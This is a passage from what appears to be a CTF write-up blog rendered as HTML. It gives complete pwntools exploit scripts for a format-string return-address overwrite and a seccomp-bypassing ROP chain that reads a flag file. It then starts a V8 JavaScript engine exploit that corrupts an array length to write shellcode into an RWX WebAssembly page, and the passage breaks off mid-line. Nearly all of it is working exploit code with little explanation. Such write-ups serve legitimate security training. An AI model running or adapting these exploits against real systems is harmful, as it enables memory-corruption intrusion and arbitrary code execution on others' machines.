class="number">0x7ffc1f9e8708</span>)</span><br><span class="line">	li(<span class="string">&#x27;main_ret: &#x27;</span> + <span class="built_in">hex</span>(main_ret))</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;,0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;main_init_leak: &#x27;</span> + <span class="built_in">hex</span>(leak - <span class="number">231</span>))</span><br><span class="line">	db()</span><br><span class="line">	libc_base = leak - (<span class="number">0x7f7d13204b97</span> - <span class="number">0x7f7d131e3000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;A&#x27;</span> * <span class="number">4</span></span><br><span class="line">	p += p64(main_ret + <span class="number">2</span>) <span class="comment">#0xF0000</span></span><br><span class="line">	li(<span class="string">&#x27;one_gadget: &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(one_gadget &amp; <span class="number">0xFFFF</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;A&#x27;</span> * <span class="number">3</span></span><br><span class="line">	p += p64(main_ret + <span class="number">0</span>) <span class="comment">#0xF0000</span></span><br><span class="line">	sl(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="4-return-to-whats-revenge"><a href="#4-return-to-whats-revenge" class="headerlink" title="4 [return-to-whats-revenge]"></a>4 [return-to-whats-revenge]</h2><p>Same as before, there is a stack overflow  vulnerability in this program. but this program has a protection in sandbox function.  It is a seccomp rule to forbid some syscall. The sandbox function content as follows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filter[24].code &#x3D; 6;</span><br><span class="line">filter[24].jt &#x3D; 0;</span><br><span class="line">filter[24].jf &#x3D; 0;</span><br><span class="line">filter[0x18].k &#x3D; 0;</span><br><span class="line">bpf_resolve_jumps(&amp;lab, filter, 0x19uLL);</span><br><span class="line">prog.len &#x3D; 0x19;</span><br><span class="line">prog.filter &#x3D; filter;</span><br><span class="line">prctl(0x26, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;prog.len, filter);&#x2F;&#x2F; PR_SET_NO_NEW_PRIVS, no execve</span><br><span class="line">prctl(0x16, 2LL, &amp;prog);</span><br></pre></td></tr></table></figure>

<p>but this program I can’t use seccomp tool to dump the rule. so it has a bad syscall  when I use orw method to exploit this program, this rule cannot use open function to open file, must use syscall with specific value in regisger to realize open function, or it will call open syscall failed! That’s a place easily to make a mistake. </p>
<p>​    you must create a open function syscall by yourself, or while calling open function in libc will be a bad syscall.</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./return-to-whats-revenge.bk&#x27;</span></span><br><span class="line"></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;chal.duc.tf&quot;</span></span><br><span class="line">server_port = <span class="number">30006</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	pop_rdi = <span class="number">0x04019db</span></span><br><span class="line">	ret = <span class="number">0x0401016</span></span><br><span class="line">	bss = <span class="number">0x404000</span> + <span class="number">0x100</span></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(<span class="number">0x4011DA</span>)</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	libc_base = leak - <span class="number">0x0809c0</span></span><br><span class="line">	li(<span class="string">&#x27;lib_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x23e6a</span></span><br><span class="line">	pop_rax = libc_base + <span class="number">0x439c8</span></span><br><span class="line">	libc_read = libc_base + <span class="number">0x110070</span></span><br><span class="line">	libc_open = libc_base + <span class="number">0x10fc40</span></span><br><span class="line">	syscall = libc_base + <span class="number">0x11007f</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">0x0</span>)</span><br><span class="line">	p += p64(pop_rsi) + p64(bss)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0x100</span>)</span><br><span class="line">	p += p64(libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># open</span></span><br><span class="line">	p += p64(pop_rdi) + p64(bss)</span><br><span class="line">	p += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">	p += p64(syscall)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	p += p64(pop_rdi) + p64(<span class="number">0x3</span>)</span><br><span class="line">	p += p64(pop_rsi) + p64(bss)</span><br><span class="line">	p += p64(pop_rdx) + p64(<span class="number">0x40</span>)</span><br><span class="line">	p += p64(libc_read)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(bss)</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#p = b&#x27;/chal/flag.txt\x00&#x27;</span></span><br><span class="line">	p = <span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">	sl(p);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="5-is-this-pwn-or-web"><a href="#5-is-this-pwn-or-web" class="headerlink" title="5 [is-this-pwn-or-web]"></a>5 [is-this-pwn-or-web]</h2><p>This puzzle is not a python sandbox escape, it is a javascript memory overflow.</p>
<h3 id="js-exp"><a href="#js-exp" class="headerlink" title="js exp"></a>js exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This challenge is meant to be extremely hard. The way this exploit goes is</span></span><br><span class="line"><span class="comment"> * essentially as follows:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 1: Read the patch.diff file to figure out the vulnerability</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 2: Use the vulnerability to get a corrupted float array. You can use</span></span><br><span class="line"><span class="comment"> *         this array to overwrite its own length to a very large number</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There</span></span><br><span class="line"><span class="comment"> *         are loads of blog posts and other V8 exploits that you can use as</span></span><br><span class="line"><span class="comment"> *         a starting point. I&#x27;ll list some below. The only issue will be that</span></span><br><span class="line"><span class="comment"> *         V8 somewhat recently started shipping with pointer compression, and</span></span><br><span class="line"><span class="comment"> *         most blog posts / exploits will be made for challenges / vulns from</span></span><br><span class="line"><span class="comment"> *         V8 versions without pointer compression.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</span></span><br><span class="line"><span class="comment"> * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/</span></span><br><span class="line"><span class="comment"> * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration</span></span><br><span class="line"><span class="comment"> * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)</span></span><br><span class="line"><span class="comment"> * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you still have questions regarding this challenge, feel free to DM me </span></span><br><span class="line"><span class="comment"> * anywhere. I&#x27;ll do my best to respond to queries!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Discord: Faith#2563</span></span><br><span class="line"><span class="comment"> * Twitter: @farazsth98</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Helper functions setup to convert between doubles and numbers when needed</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u32_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == float</span></span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> BigInt(u32_buf[<span class="number">0</span>]) + (BigInt(u32_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>); <span class="comment">// Watch for little endianness</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == BigInt</span></span><br><span class="line">    u32_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u32_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) == BigInt</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + val.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We set up a web assembly page. This is mapped as an RWX page that we will</span></span><br><span class="line"><span class="comment">// later write shellcode into.</span></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] WebAssembly RWX page setup!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Next, set up three arrays. These will be allocated one after another because</span></span><br><span class="line"><span class="comment">// of the deterministic nature of the V8 heap. We corrupt the float array.</span></span><br><span class="line"><span class="comment">// You can find their offsets relative to each other using GDB.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// While we do this, we also trigger the vulnerability to get a corrupted</span></span><br><span class="line"><span class="comment">// float array in `float_arr`</span></span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>];</span><br><span class="line">float_arr = float_arr.slice(<span class="number">0</span>); <span class="comment">// Trigger the vuln</span></span><br><span class="line"><span class="keyword">var</span> addrof_arr = [&#123;&#125;, &#123;&#125;]; <span class="comment">// Used for the addrof primitive later</span></span><br><span class="line"><span class="keyword">var</span> arb_read_arr = [<span class="number">1.1</span>]; <span class="comment">// Used for the arbitrary read primitive later</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We set up an ArrayBuffer and a DataView. We will use these later to write </span></span><br><span class="line"><span class="comment">// our shellcode into the RWX page.</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We need to store the current `elements` ptr before we corrupt the length</span></span><br><span class="line"><span class="comment">// because corrupting the length also requires us to corrupt the `elements` ptr</span></span><br><span class="line"><span class="comment">// in the process</span></span><br><span class="line"><span class="keyword">var</span> float_arr_elem = ftoi(float_arr[<span class="number">2</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Corrupt the length and keep the `elements` ptr intact</span></span><br><span class="line">float_arr[<span class="number">2</span>] = itof((<span class="number">0x1000n</span> &lt;&lt; <span class="number">32n</span>) + 